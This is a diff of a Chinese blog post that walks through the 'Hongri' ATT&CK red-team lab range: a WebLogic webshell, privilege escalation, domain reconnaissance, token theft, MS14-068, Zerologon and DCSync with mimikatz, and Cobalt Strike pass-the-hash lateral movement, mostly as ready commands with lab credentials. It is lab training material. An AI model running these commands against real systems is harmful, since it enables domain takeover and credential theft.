@@ -6,17 +6,26 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。 简易网络拓扑 WEB打点Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。 webshell地址：http:&#x2F;&#x2F;192.168.124.45&#x2F;:7001&#x2F;wls-wsat&#x2F;test.jsp">
+    <meta name="description" content="靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。 简易网络拓扑 WEB打点Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。 webshell地址：http:&#x2F;&#x2F;192.168.124.45&#x2F;:7001&#x2F;wls-wsat&#x2F;test.jsp  Windows提权weblogic的webshell权限不是administrator权限，这里先cs上线之">
 <meta property="og:type" content="article">
 <meta property="og:title" content="红日靶场-ATT&amp;CK红队评估实战靶场二">
 <meta property="og:url" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/index.html">
 <meta property="og:site_name" content="Dtuncle&#39;s Blog">
-<meta property="og:description" content="靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。 简易网络拓扑 WEB打点Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。 webshell地址：http:&#x2F;&#x2F;192.168.124.45&#x2F;:7001&#x2F;wls-wsat&#x2F;test.jsp">
+<meta property="og:description" content="靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。 简易网络拓扑 WEB打点Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。 webshell地址：http:&#x2F;&#x2F;192.168.124.45&#x2F;:7001&#x2F;wls-wsat&#x2F;test.jsp  Windows提权weblogic的webshell权限不是administrator权限，这里先cs上线之">
 <meta property="og:locale">
 <meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-16446515727731.png">
 <meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220212160424896.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215002830140.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215003246767.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215015109814.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215021322422-16448624045641.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220014047496.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220035152207.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220044545851.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050042702.png">
+<meta property="og:image" content="https://dtuncle.github.io/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220050621332.png">
 <meta property="article:published_time" content="2022-02-11T16:18:44.449Z">
-<meta property="article:modified_time" content="2022-02-12T08:04:48.007Z">
+<meta property="article:modified_time" content="2022-02-19T21:12:08.474Z">
 <meta property="article:author" content="dtuncle">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="域渗透">
@@ -110,7 +119,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">简易网络拓扑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">WEB打点</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">1.</span> <span class="toc-text">简易网络拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">WEB打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">Windows提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">内网基础信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">一、环境信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.</span> <span class="toc-text">二、密码信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-number">5.</span> <span class="toc-text">提升权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81AccessToken%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">5.1.</span> <span class="toc-text">一、AccessToken令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81incognito-exe"><span class="toc-number">5.1.1.</span> <span class="toc-text">1、incognito.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Invoke-TokenManipulation-ps1"><span class="toc-number">5.1.2.</span> <span class="toc-text">2、Invoke-TokenManipulation.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81MSF-incognito"><span class="toc-number">5.1.3.</span> <span class="toc-text">3、MSF-incognito</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">5.2.</span> <span class="toc-text">二、委派攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81GPP-%E7%BB%84%E7%AD%96%E7%95%A5-%E5%88%A9%E7%94%A8%EF%BC%88MS14-025%EF%BC%89"><span class="toc-number">5.3.</span> <span class="toc-text">三、GPP(组策略)利用（MS14-025）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Kerberos%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88MS14-068%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">四、Kerberos域用户提权漏洞（MS14-068）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2020-1472"><span class="toc-number">5.5.</span> <span class="toc-text">五、NetLogon域内提权漏洞(CVE-2020-1472)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">6.</span> <span class="toc-text">结束</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -160,10 +169,127 @@
 
   <div class="content" itemprop="articleBody">
     <p>靶场不能锻炼思维，只能用于练练手，基本操作一下避免手生。</p>
-<h1 id="简易网络拓扑"><a href="#简易网络拓扑" class="headerlink" title="简易网络拓扑"></a>简易网络拓扑</h1><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-16446515727731.png" alt="未命名文件"></p>
-<h1 id="WEB打点"><a href="#WEB打点" class="headerlink" title="WEB打点"></a>WEB打点</h1><p>Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。</p>
+<h2 id="简易网络拓扑"><a href="#简易网络拓扑" class="headerlink" title="简易网络拓扑"></a>简易网络拓扑</h2><p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-16446515727731.png" alt="未命名文件"></p>
+<h2 id="WEB打点"><a href="#WEB打点" class="headerlink" title="WEB打点"></a>WEB打点</h2><p>Weblogic10 XMLDecoder反序列化漏洞，直接上传写入哥斯拉webshell。</p>
 <p>webshell地址：<a target="_blank" rel="noopener" href="http://192.168.124.45/:7001/wls-wsat/test.jsp">http://192.168.124.45/:7001/wls-wsat/test.jsp</a></p>
 <p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220212160424896.png" alt="image-20220212160424896"></p>
+<h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><p>weblogic的webshell权限不是administrator权限，这里先cs上线之后进行提权操作。systeminfo查看补丁情况，选择MS16-135提权。这里用cs插件提权查看虚拟机会闪现一个框，之后找找静默的exp。</p>
+<h2 id="内网基础信息收集"><a href="#内网基础信息收集" class="headerlink" title="内网基础信息收集"></a>内网基础信息收集</h2><p>提权之后需要收集这台机器上某些信息。</p>
+<h3 id="一、环境信息"><a href="#一、环境信息" class="headerlink" title="一、环境信息"></a>一、环境信息</h3><p>1、网络情况</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看网络连接</span></span><br><span class="line">arp <span class="literal">-a</span> <span class="comment">#查看arp表</span></span><br><span class="line">route print <span class="comment">#路由信息</span></span><br></pre></td></tr></table></figure>
+
+<p>2、杀软情况和用户运行程序情况</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure>
+
+<p>3、内网扫描</p>
+<p>根据网络情况，使用扫描工具扫描内网中机器</p>
+<p>4、域信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all <span class="comment">#可查看是否有域</span></span><br><span class="line">net user /domain <span class="comment">#查看域用户</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">#查看域管理员</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain <span class="comment">#查看域控制器</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain <span class="comment">#查看域机器</span></span><br></pre></td></tr></table></figure>
+
+<p>总结环境情况，在域中，当前只有sqlserver使用的域用户mssql。</p>
+<p>考虑AccessToken令牌窃取mssql用户，进行委派攻击</p>
+<p>或者直接利用 GPP(组策略)利用（MS14-025）、Kerberos域用户提权漏洞（MS14-068）、CVE-2021-42287&amp;42278、NetLogon域内提权漏洞(CVE-2020-1472)等。</p>
+<p>域控制器ip：10.10.10.10</p>
+<h3 id="二、密码信息"><a href="#二、密码信息" class="headerlink" title="二、密码信息"></a>二、密码信息</h3><p>1、windows2008R2可以直接mimikatz获取密码情况</p>
+<p>2、RDP保存的密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br><span class="line"><span class="built_in">dir</span> /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p>3、浏览器信息收集</p>
+<p>4、其他应用密码</p>
+<p>靶场通用密码，不直接利用密码。</p>
+<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><h3 id="一、AccessToken令牌窃取"><a href="#一、AccessToken令牌窃取" class="headerlink" title="一、AccessToken令牌窃取"></a>一、AccessToken令牌窃取</h3><p>AccessToken窃取和利用需要管理员，前面已经提权。</p>
+<p>窃取accesstoken的方法：</p>
+<p>incognito.exe程序 、InvokeTokenManipulat.ps1脚本 、MSF里的incognito模块</p>
+<h4 id="1、incognito-exe"><a href="#1、incognito-exe" class="headerlink" title="1、incognito.exe"></a>1、incognito.exe</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
+<p>获取所有token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe  list_tokens -u</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215002830140.png" alt="image-20220215002830140"></p>
+<p>如果要使用AccessToken模拟其他用户，可以使用命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;完整的Token名&quot;</span> cmd.exe</span><br><span class="line"></span><br><span class="line">提权至system：</span><br><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br><span class="line">降权至当前用户：</span><br><span class="line">incognito.exe execute <span class="literal">-c</span> <span class="string">&quot;当前用户token&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215003246767.png" alt="image-20220215003246767"></p>
+<p>这里cs实际上在进程列表是可以直接窃取的，演示一下incognito来窃取利用启动exe。可以直接运行cspayload，也可以cs注入到mssql用户进程。</p>
+<h4 id="2、Invoke-TokenManipulation-ps1"><a href="#2、Invoke-TokenManipulation-ps1" class="headerlink" title="2、Invoke-TokenManipulation.ps1"></a>2、Invoke-TokenManipulation.ps1</h4><p>脚本是PowerSploit下Exfiltration文件夹内的一个脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-Enumerate</span></span><br><span class="line">提权至system</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-username</span> <span class="string">&quot;nt authority\system&quot;</span></span><br><span class="line">复制进程token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-ProcessId</span> <span class="number">500</span></span><br><span class="line">复制线程token</span><br><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-CreateProcess</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-ThreadId</span> <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、MSF-incognito"><a href="#3、MSF-incognito" class="headerlink" title="3、MSF-incognito"></a>3、MSF-incognito</h4><p>很少使用msf</p>
+<h3 id="二、委派攻击"><a href="#二、委派攻击" class="headerlink" title="二、委派攻击"></a>二、委派攻击</h3><p>1、查询非约束委派用户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215015109814.png" alt="image-20220215015109814"></p>
+<p>没有可利用用户</p>
+<p>2、查询约束委派</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-h</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-u</span> mssql <span class="literal">-up</span> <span class="number">1</span>qaz@WSX <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds<span class="literal">-allowedtodelegateto</span></span><br></pre></td></tr></table></figure>
+
+<p>这里需要域用户账号密码，前面读出来过，但是也没有可利用用户就无所谓了。</p>
+<p>3、资源约束委派</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-h</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">-u</span> mssql <span class="literal">-up</span> <span class="number">1</span>qaz@WSX <span class="literal">-b</span> <span class="string">&quot;DC=de1ay,DC=com&quot;</span> <span class="operator">-f</span> <span class="string">&quot;objectClass=computer&quot;</span> mS<span class="literal">-DS-CreatorSID</span></span><br></pre></td></tr></table></figure>
+
+<p>查询机器加入域对应用的域用户，也没查询出sid。</p>
+<p>其实应该是通过用户查询有哪些机器，先练资源约束委派而已。</p>
+<h3 id="三、GPP-组策略-利用（MS14-025）"><a href="#三、GPP-组策略-利用（MS14-025）" class="headerlink" title="三、GPP(组策略)利用（MS14-025）"></a>三、GPP(组策略)利用（MS14-025）</h3><p>微软对于这个洞的介绍：</p>
+<blockquote>
+<p>此安全更新可解决 Microsoft Windows 中一个公开披露的漏洞。如果 Active Directory 组策略首选项用于跨域分发密码，该漏洞可能允许特权提升，这种做法可能允许攻击者检索并解密使用组策略首选项存储的密码。</p>
+<p>对于安装在 Windows Vista、Windows 7、Windows 8 和 Windows 8.1 的受影响版本上的远程服务器管理工具，此安全更新的等级为“重要”。对于 Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2 的所有受支持版本，此更新的等级为“重要”。</p>
+<p>该安全更新通过删除使用特定组策略首选项扩展配置和分发密码的功能来解决漏洞。</p>
+</blockquote>
+<p>使用Get-GPPPassword.ps1直接查询密码。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-command</span> <span class="string">&quot;&amp;&#123;Import-Module .\bea\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220215021322422-16448624045641.png" alt="image-20220215021322422"></p>
+<p>报错，不知道是不是因为没有找到密码，手动查看了下\\dc.de1ay.com\SYSVOL\de1ay.com下没有xml文件记录密码信息。</p>
+<h3 id="四、Kerberos域用户提权漏洞（MS14-068）"><a href="#四、Kerberos域用户提权漏洞（MS14-068）" class="headerlink" title="四、Kerberos域用户提权漏洞（MS14-068）"></a>四、Kerberos域用户提权漏洞（MS14-068）</h3><p>微软对于这个洞的介绍：</p>
+<blockquote>
+<p>该漏洞可能允许攻击者将未经授权的域用户帐户的权限，提升到域管理员帐户的权限。攻击者可能使用这些提升的权限来侵入域中的任何计算机，包括域控制器。攻击者必须有有效的域凭据才能利用此漏洞。拥有域凭据的标准用户帐户可以远程使用受影响的组件；只有本地帐户凭据的用户则不能。</p>
+<p>对于所有受支持的 Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 及 Windows Server 2012 R2 版本</p>
+</blockquote>
+<p>使用工具ms14-068：<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-u</span>：用户名<span class="selector-tag">@</span>域名</span><br><span class="line"><span class="literal">-s</span>：用户SID</span><br><span class="line"><span class="literal">-d</span>：域控制器地址</span><br><span class="line"><span class="literal">-p</span>：明文密码</span><br><span class="line"><span class="literal">--rc4</span>：在没有明文密码的情况下，通过NTLM Hash登录</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">ms14<span class="literal">-068</span>.exe <span class="literal">-u</span> mssql@de1ay.com <span class="literal">-s</span> S<span class="literal">-1-5-21-2756371121-2868759905-3853650604-2103</span> <span class="literal">-d</span> <span class="number">10.10</span>.<span class="number">10.10</span> <span class="literal">--rc4</span> <span class="number">161</span>cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure>
+
+<p>会在当前目录下生成TGT票据。</p>
+<p>然后使用mimikatz注入生成的票据就行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::ptc&quot;</span> <span class="string">&quot;TGT_mssql@de1ay.com.ccache&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220014047496.png" alt="image-20220220014047496"></p>
+<h3 id="五、NetLogon域内提权漏洞-CVE-2020-1472"><a href="#五、NetLogon域内提权漏洞-CVE-2020-1472" class="headerlink" title="五、NetLogon域内提权漏洞(CVE-2020-1472)"></a>五、NetLogon域内提权漏洞(CVE-2020-1472)</h3><p>漏洞原理：</p>
+<p>Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，可以向域发起Netlogon 计算机账户认证请求, 使用8字节全0 client challenge 不断尝试得到一个正确的8字节全0 client credential 通过认证，再通过相关调用完成对域控密码的修改。</p>
+<p>操作步骤：</p>
+<p>1、验证漏洞存在</p>
+<p>使用新版的mimikatz加入了NetLogon利用的模块。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:10.10.10.10 /account:DC<span class="variable">$</span>&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>返回 * Authentication: OK – vulnerable 则是可以利用此洞</p>
+<p>2、置空域控HASH</p>
+<p>域控的机器帐户HASH存储在注册表中，系统启动时会将其加载到lsass，当攻击置空域控HASH后，仅AD (NTDS.DIT) 中的密码会更改，而不是注册表或加载到lsass中的密码，这样将会导致域控脱域，无法使用Kerberos进行身份验证，因此要尽快恢复。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:10.10.10.10 /account:DC<span class="variable">$</span> /exploit&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>3、获取域管HASH</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\bea\x64\mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:de1ay.com /dc:DC /user:administrator /authuser:DC<span class="variable">$</span> /authdomain:main /authpassword:\&quot;</span>\<span class="string">&quot; /authntlm&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20220220035152207.png" alt="image-20220220035152207"></p>
+<p>4、恢复域控HASH</p>
+<p>mimikatz工具内置恢复域控HASH是将NTDS.DIT中的凭证以及注册表&#x2F;lsass中的凭证同时修改为 (<code>Waza1234/Waza1234/Waza1234</code>)并不是原密码，因此不太实用。</p>
+<p>要恢复原始hash，先要获取注册表信息中域控原始hash。</p>
+<p>这里环境因为DC是在10段所以先用web这台机器生成中转监听</p>
+<p>再使用cs的用凭证去横向上线DC</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">pth de1ay.com\Administrator <span class="number">161</span>cff084477fe596a5db81874498a24</span><br><span class="line">jump psexec_psh DC <span class="number">10</span> //<span class="number">10</span>是中转监听的名称、dc是域控名</span><br></pre></td></tr></table></figure>
+
